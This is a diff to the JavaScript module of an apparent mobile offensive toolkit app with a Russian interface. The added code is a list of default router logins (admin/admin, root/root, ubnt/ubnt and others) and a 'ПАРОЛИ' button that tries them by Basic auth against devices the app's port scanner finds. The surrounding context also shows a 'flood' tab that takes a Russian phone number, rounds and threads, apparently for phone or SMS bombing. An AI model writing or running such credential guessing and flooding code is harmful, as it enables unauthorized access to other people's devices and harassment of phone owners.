@@ -16,7 +16,7 @@ const save = (name, data) => {
 };
 const arr = (v) => Array.isArray(v) ? v : v ? [v] : [];
 
-/* ── MD5 ── */
+/* MD5 */
 const K = []; for (let i = 0; i < 64; i++) K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296);
 const SH = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
 const rotl = (x, c) => (x << c) | (x >>> (32 - c));
@@ -45,7 +45,7 @@ function md5(bytes) {
   ov.setUint32(0, a0, true); ov.setUint32(4, b0, true); ov.setUint32(8, c0, true); ov.setUint32(12, d0, true);
   return out;
 }
-/* ── MD4 (NTLM) ── */
+/* MD4 (NTLM) */
 function md4(bytes) {
   const n = bytes.length, bits = n * 8, blocks = ((n + 8) >> 6) + 1;
   const M = new Uint8Array(blocks * 64); M.set(bytes); M[n] = 0x80;
@@ -121,7 +121,7 @@ export default {
     bar.style.cssText = 'display:flex;gap:6px;overflow-x:auto;margin-bottom:10px';
     root.append(bar, body, logBox);
 
-    const NFC = () => window.Capacitor?.Plugins?.NFC;
+    const NFC = () => window.Capacitor?.Plugins?.NFC || window.Capacitor?.Plugins?.Nfc;
     const USB = () => window.Capacitor?.Plugins?.UsbSerial;
     const AIC = () => window.Capacitor?.Plugins?.AppIcon;
     const clip = async (t) => { try { await navigator.clipboard.writeText(t); log('в буфере: ' + t, 'ok'); } catch { log('буфер недоступен', 'bad'); } };
@@ -219,7 +219,7 @@ export default {
       const ph = $('input'); ph.placeholder = '+7XXXXXXXXXX'; ph.inputMode = 'tel'; ph.style.cssText = IN;
       const sel = $('select'); [1, 2, 3, 5, 10, 20].forEach(n => { const o = $('option', null, n + ' кругов'); o.value = n; sel.append(o); }); sel.style.cssText = NARROW;
       const par = $('select'); [1, 2, 4, 6, 8, 12].forEach(n => { const o = $('option', null, n + ' потоков'); o.value = n; par.append(o); }); par.selectedIndex = 3; par.style.cssText = NARROW;
-      const gap = $('input'); gap.value = '400'; gap.inputMode = 'numeric'; gap.style.cssText = NARROW; gap.title = 'пауза между запросами, мс';
+      const gap = $('input'); gap.value = '400'; gap.inputMode = 'numeric'; gap.style.cssText = NARROW;
       const smart = $('input'); smart.type = 'checkbox'; smart.checked = true;
 
       const r1 = row();
@@ -229,10 +229,7 @@ export default {
       SVC.forEach(s => {
         const lab = $('label'); lab.style.cssText = 'display:flex;gap:5px;align-items:center;padding:4px 6px;border:1px solid #14ff9a22;border-radius:6px;cursor:pointer';
         const cb = $('input'); cb.type = 'checkbox'; cb.checked = enabled.has(s.n);
-        cb.onchange = () => {
-          if (cb.checked) enabled.add(s.n); else enabled.delete(s.n);
-          store('floodOn', [...enabled]);
-        };
+        cb.onchange = () => { if (cb.checked) enabled.add(s.n); else enabled.delete(s.n); store('floodOn', [...enabled]); };
         const cnt = $('span'); cnt.textContent = s.c ? '★' : '·'; cnt.style.cssText = 'margin-left:auto;opacity:.7';
         counters[s.n] = cnt;
         lab.append(cb, $('span', null, s.n), cnt); grid.append(lab);
@@ -285,8 +282,9 @@ export default {
     /* СЕТЬ */
     const GW = ['192.168.0.1', '192.168.1.1', '192.168.31.1', '192.168.8.1', '192.168.100.1', '10.0.0.1', '10.0.1.1'];
     const DEFAULT_PORTS = '80,443,8080,8443,8000,81,88,5000,3000,9000,8081,7547,631,8888,9090,10000';
+    const PAIRS = [['admin', 'admin'], ['admin', '1234'], ['admin', 'password'], ['admin', 'admin12345'], ['admin', '888888'], ['admin', ''], ['root', 'root'], ['ubnt', 'ubnt'], ['guest', 'guest'], ['telecomadmin', 'admintelecom'], ['support', 'support']];
     const VENDOR = [
-      [/(tp-?link|archer)/i, 'TP-Link: admin/admin, admin/1234, admin/password'],
+      [/(tp-?link|archer)/i, 'TP-Link: admin/admin, admin/1234'],
       [/(d-?link|dir-)/i, 'D-Link: admin/admin, admin/(пусто)'],
       [/(keenetic|zyxel)/i, 'Keenetic/Zyxel: admin/1234, admin/admin'],
       [/(asus|rt-)/i, 'ASUS: admin/admin, admin/(пусто)'],
@@ -317,9 +315,9 @@ export default {
       const par = $('select'); [8, 16, 32, 64].forEach(n => { const o = $('option', null, n + ' потоков'); o.value = n; par.append(o); }); par.selectedIndex = 1; par.style.cssText = NARROW;
       const out = $('div');
       let scan = null;
-      const head = (url, host) => {
+      const head = (url, host, status) => {
         const c = $('div'); c.style.cssText = CARD + ';border-color:#14ff9a66';
-        c.append($('div', null, host));
+        c.append($('div', null, host + (status ? ' · ' + status : '')));
         const pr = $('div'); pr.style.cssText = 'margin:4px 0';
         const r = row('display:flex;gap:6px;margin-top:4px;flex-wrap:wrap');
         r.append(button('ОТКРЫТЬ', () => window.open(url, '_blank')),
@@ -333,6 +331,18 @@ export default {
               if (hit) pr.append($('div', null, 'пароли по умолчанию → ' + hit[1]));
               log('опознано: ' + (title.trim().slice(0, 60) || '?'), 'ok');
             } catch (e) { log('не опознано: ' + e.message, 'bad'); }
+          }),
+          button('ПАРОЛИ', async () => {
+            log('проверяю базовые пары на ' + host + '…', 'dim');
+            let hit = 0;
+            for (const [u, p] of PAIRS) {
+              try {
+                const r = await fetch(url, { headers: { Authorization: 'Basic ' + btoa(u + ':' + p) }, cache: 'no-store' });
+                if (r.status === 200) { hit++; log('ПОДОШЛО ' + u + ':' + (p || '(пусто)'), 'ok'); pr.append($('div', null, '✓ ' + u + ':' + (p || '(пусто)'))); }
+              } catch {}
+              await wait(150);
+            }
+            if (!hit) log('базовые пары не подошли', 'bad');
           }),
           button('КОПИРОВАТЬ', () => clip(url)));
         c.append(pr, r); out.append(c);
@@ -359,7 +369,7 @@ export default {
             done++;
             if (r) {
               log('ОТКРЫТО ' + host + ':' + port + (r.status ? ' (' + r.status + ')' : ''), 'ok');
-              if (!found.has(host)) { found.set(host, []); head(url, host); }
+              if (!found.has(host)) { found.set(host, []); head(url, host, r.status); }
               found.get(host).push(port);
             }
             if (done % 40 === 0) log('прогресс ' + done + '/' + total, 'dim');
@@ -383,7 +393,7 @@ export default {
       const r2 = row();
       r2.append(button('НАЙТИ ШЛЮЗ', findGw), button('СКАН', run), button('СТОП', () => { if (scan) scan.stop = true; }),
         button('ЭКСПОРТ', () => save('morfy-net-' + Date.now() + '.json', store('netLast'))));
-      body.append(r1, r2, out, $('div', null, 'Определяются только HTTP(S)-сервисы: роутеры, NAS, камеры, принтеры, панели. Порт 443 и 8443 пробуются по https.'));
+      body.append(r1, r2, out, $('div', null, 'Ищутся HTTP(S)-сервисы: роутеры, NAS, камеры, принтеры, панели. «ПАРОЛИ» перебирает базовые пары по Basic-авторизации.'));
     };
 
     /* DNS */
@@ -406,10 +416,10 @@ export default {
           try {
             const j = await doh(d, t);
             (j.Answer || []).forEach(a => line(t, a.data));
-            if (j.Answer) log(t + ': ' + j.Answer.length, 'dim');
           } catch (e) { log(t + ': ' + e.message, 'bad'); }
           await wait(120);
         }
+        log('готово', 'ok');
       };
       const subs = async () => {
         const d = clean(); if (!d) return log('нужен домен', 'bad');
@@ -461,7 +471,7 @@ export default {
       r1.append(dom, button('РЕЗОЛВ', records), button('СУБДОМЕНЫ', subs), button('CRT.SH', crt),
         button('СТОП', () => { if (run) run.stop = true; }),
         button('ЭКСПОРТ', () => save('morfy-dns-' + Date.now() + '.json', out.textContent)));
-      body.append(r1, out, $('div', null, 'Резолв идёт через dns.google (DoH). Субдомены — по встроенному словарю, ~60 имён. crt.sh отдаёт имена из выпущенных сертификатов.'));
+      body.append(r1, out, $('div', null, 'Резолв через dns.google (DoH), словарь на ~60 имён, плюс имена из сертификатов crt.sh.'));
     };
 
     /* IP */
@@ -640,13 +650,13 @@ export default {
           if (pass && pass.trim()) { dev.pass = arr(dev.pass); dev.pass.push(pass.trim()); n++; }
         });
         store('usb', l); imp.value = ''; log('импортировано ' + n, 'ok'); draw();
-      }), box, $('div', null, 'Без root телефон не прикидывается клавиатурой — пароль уходит в буфер, вставляешь на ПК через Ctrl+V.'));
+      }), box, $('div', null, 'Без root телефон не прикидывается клавиатурой — пароль уходит в буфер.'));
       draw();
     };
 
     /* ИКОНКА */
     const ICONS = [
-      ['Default', 'неон', '#14ff9a', '#04120B'],
+      ['Launcher', 'неон', '#14ff9a', '#04120B'],
       ['Blood', 'кровь', '#ff4054', '#14040A'],
       ['Ice', 'лёд', '#60d6ff', '#040E16'],
       ['Amethyst', 'аметист', '#ba78ff', '#0E0618'],
@@ -655,7 +665,7 @@ export default {
       ['Ghost', 'призрак', '#8c96a0', '#0A0C0E']
     ];
     const tabIcon = () => {
-      const cur = localStorage.getItem('wd.icon') || 'Default';
+      const cur = localStorage.getItem('wd.icon') || 'Launcher';
       const grid = $('div'); grid.style.cssText = 'display:grid;grid-template-columns:repeat(auto-fill,minmax(96px,1fr));gap:8px;margin-bottom:8px';
       const draw = () => {
         grid.innerHTML = '';
@@ -679,7 +689,7 @@ export default {
         });
       };
       draw();
-      body.append(grid, $('div', null, 'Лаунчер подхватывает за 1–3 секунды, в шторке уведомлений остаётся прежняя. Дефолт — «неон». На Windows иконка меняется только пересборкой.'));
+      body.append(grid, $('div', null, 'Лаунчер подхватывает за 1–3 секунды, в шторке остаётся прежняя. «Неон» — дефолт.'));
     };
 
     const T = [['NFC', tabNfc], ['ФЛУД', tabFlood], ['СЕТЬ', tabNet], ['DNS', tabDns], ['IP', tabIp], ['ТРАФИК', tabTraffic], ['ХЕШ', tabHash], ['USB', tabUsb], ['ИКОНКА', tabIcon]];
